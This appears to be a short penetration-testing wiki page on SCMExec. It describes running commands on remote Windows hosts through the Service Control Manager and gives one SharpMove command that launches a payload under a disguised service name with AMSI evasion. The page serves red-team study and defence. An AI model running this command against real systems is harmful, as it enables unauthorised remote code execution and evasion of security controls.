# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** is a technique to execute commands on remote systems using the Service Control Manager (SCM) to create a service that runs the command. This method can bypass some security controls, such as User Account Control (UAC) and Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}